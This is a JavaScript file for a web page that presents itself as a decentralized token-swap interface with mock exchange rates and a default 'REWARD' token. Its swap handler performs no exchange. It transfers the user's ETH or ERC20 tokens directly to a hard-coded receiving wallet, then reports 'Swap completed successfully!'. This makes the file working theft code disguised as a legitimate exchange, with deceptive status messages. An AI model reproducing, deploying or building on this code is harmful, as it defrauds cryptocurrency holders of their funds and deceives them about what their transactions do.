// app.js - DEX-like Token Swap Interface

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let walletConnectConnector = null;
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
    document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
    document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
    document.getElementById("swapBtn").addEventListener("click", handleSwap);
    document.getElementById("settingsBtn").addEventListener("click", showSettings);
    document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
    document.getElementById("closeSettings").addEventListener("click", hideSettings);
    document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
    document.getElementById("walletConnectBtn").addEventListener("click", initWalletConnect);
    document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
    document.getElementById("fromAmount").addEventListener("input", updateToAmount);
    
    // Set default tokens
    const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
    const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "REWARD");
    
    if (defaultFromToken && defaultToToken) {
      currentFromToken = defaultFromToken;
      currentToToken = defaultToToken;
      updateTokenSelectors();
    }
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  // Mobile-specific checks can be added here if needed
}

async function initializeWallet() {
  try {
    if (walletConnectConnector) {
      provider = new ethers.providers.Web3Provider(walletConnectConnector);
    } else {
      provider = new ethers.providers.Web3Provider(window.ethereum);
    }
    
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    updateWalletButton(true);
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

async function handleNetworkChange(network) {
  currentNetwork = network;
  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
  
  // Reset tokens when network changes
  currentFromToken = null;
  currentToToken = null;
  updateTokenSelectors();
  
  if (userAddress) {
    await checkNetwork();
  }
}

async function checkNetwork() {
  try {
    let chainId;
    if (walletConnectConnector) {
      chainId = await walletConnectConnector.request({ method: 'eth_chainId' });
    } else {
      chainId = await window.ethereum.request({ method: 'eth_chainId' });
    }
    
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        if (walletConnectConnector) {
          await walletConnectConnector.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        } else {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: targetChainId }]
          });
        }
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            if (walletConnectConnector) {
              await walletConnectConnector.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            } else {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [NETWORK_CONFIGS[currentNetwork]]
              });
            }
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  
  // Clear previous items
  tokenItems.innerHTML = '';
  
  // Filter tokens for current network
  const networkTokens = TOKENS[currentNetwork] || [];
  
  // Add tokens to list
  networkTokens.forEach(token => {
    const tokenItem = document.createElement('div');
    tokenItem.className = 'dex-token-item';
    tokenItem.innerHTML = `
      <img src="https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           alt="${token.symbol}">
      <div>
        <div class="dex-token-name">${token.name}</div>
        <div class="dex-token-symbol">${token.symbol}</div>
      </div>
    `;
    
    tokenItem.addEventListener('click', () => {
      if (type === 'from') {
        currentFromToken = token;
      } else {
        currentToToken = token;
      }
      updateTokenSelectors();
      hideTokenList();
      updateToAmount();
    });
    
    tokenItems.appendChild(tokenItem);
  });
  
  modal.style.display = 'flex';
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    fromTokenBtn.innerHTML = `
      <img src="https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentFromToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    fromTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  if (currentToToken) {
    toTokenBtn.innerHTML = `
      <img src="https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24">
      <span>${currentToToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    toTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  updateSwapButton();
}

function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && currentToToken && fromAmount > 0) {
    // Simple conversion for demo (in a real DEX you'd get this from an API)
    const rate = getConversionRate(currentFromToken, currentToToken);
    const toAmount = fromAmount * rate;
    
    document.getElementById("toAmount").value = toAmount.toFixed(6);
    document.getElementById("exchangeRate").textContent = `1 ${currentFromToken.symbol} = ${rate} ${currentToToken.symbol}`;
    document.getElementById("minReceived").textContent = `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
  }
  
  updateSwapButton();
}

function getConversionRate(fromToken, toToken) {
  // Simple mock rates for demo
  const rates = {
    'ETH-REWARD': 0.05,
    'REWARD-ETH': 20,
    'ETH-USDT': 1800,
    'USDT-ETH': 0.00055,
    'ETH-USDC': 1800,
    'USDC-ETH': 0.00055,
    'ETH-DAI': 1800,
    'DAI-ETH': 0.00055,
  };
  
  const pair = `${fromToken.symbol}-${toToken.symbol}`;
  return rates[pair] || 1; // Default to 1:1 if no rate found
}

// =====================
// SWAP FUNCTIONS
// =====================

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) return;
  
  try {
    showLoader();
    updateStatus("Processing swap...", "success");
    
    if (currentFromToken.isNative) {
      // Native token transfer (ETH, BNB, MATIC)
      await transferNativeToken(fromAmount);
    } else {
      // ERC20 token transfer
      await transferERC20Token(currentFromToken, fromAmount);
    }
    
    updateStatus("Swap completed successfully!", "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Swap failed: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

async function transferNativeToken(amount) {
  const tx = await signer.sendTransaction({
    to: RECEIVING_WALLET,
    value: ethers.utils.parseEther(amount.toString()),
    gasLimit: 21000
  });
  
  await tx.wait();
}

async function transferERC20Token(token, amount) {
  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const decimals = token.decimals || 18;
  const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
  
  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
    gasLimit: 100000
  });
  
  await tx.wait();
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.textContent = message;
  statusDiv.className = `dex-status ${type}`;
  
  // Hide after 5 seconds
  setTimeout(() => {
    statusDiv.style.display = "none";
  }, 5000);
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    return;
  }
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) {
    btn.disabled = true;
    btnText.textContent = "Enter Amount";
    return;
  }
  
  btn.disabled = false;
  btnText.textContent = "Swap";
}

function showNetworkOptions() {
  // In a real app, you'd show a modal with network options
  // For demo, just toggle between Ethereum and BSC
  const newNetwork = currentNetwork === "ethereum" ? "bsc" : "ethereum";
  handleNetworkChange(newNetwork);
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}

// =====================
// WALLET CONNECTION
// =====================

async function handleWalletConnection() {
  if (userAddress) return; // Already connected
  
  if (!window.ethereum && !walletConnectConnector) {
    showWalletConnect();
    return;
  }
  
  await connectAndProcess();
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

async function initWalletConnect() {
  try {
    hideWalletConnect();
    showLoader();
    updateStatus("Initializing WalletConnect...", "success");
    
    walletConnectConnector = new WalletConnect.Client({
      projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
      metadata: {
        name: "Token Swap Portal",
        description: "Swap and transfer tokens",
        url: window.location.href,
        icons: ["https://cryptologos.cc/logos/ethereum-eth-logo.png"]
      }
    });
    
    walletConnectConnector.on("session_update", (error, payload) => {
      if (error) throw error;
      const { chainId, accounts } = payload.params[0];
      userAddress = accounts[0];
    });

    walletConnectConnector.on("connect", (error, payload) => {
      if (error) throw error;
      const { chainId, accounts } = payload.params[0];
      userAddress = accounts[0];
      connectAndProcess();
    });

    walletConnectConnector.on("disconnect", (error, payload) => {
      if (error) throw error;
      walletConnectConnector = null;
      userAddress = null;
      updateStatus("WalletConnect disconnected", "error");
      updateWalletButton(false);
    });
    
    await walletConnectConnector.createSession();
    
    const qrDiv = document.getElementById("walletConnectQR");
    qrDiv.innerHTML = '<p>Scan with your mobile wallet</p>';
    QRCode.toCanvas(qrDiv, walletConnectConnector.uri, { width: 200 }, (error) => {
      if (error) {
        console.error("QR code error:", error);
        qrDiv.innerHTML = '<p>Error generating QR code. Please try again.</p>';
      }
    });
    
    showWalletConnect();
  } catch (err) {
    console.error("WalletConnect error:", err);
    updateStatus("WalletConnect initialization failed", "error");
    walletConnectConnector = null;
  } finally {
    hideLoader();
  }
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    if (!window.ethereum && !walletConnectConnector) {
      throw new Error("Please install a Web3 wallet or use WalletConnect");
    }

    if (!walletConnectConnector) {
      await window.ethereum.request({ method: "eth_requestAccounts" });
    }
    
    await checkNetwork();
    const initialized = await initializeWallet();
    if (!initialized) return;
    
    updateSwapButton();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
  } finally {
    hideLoader();
  }
}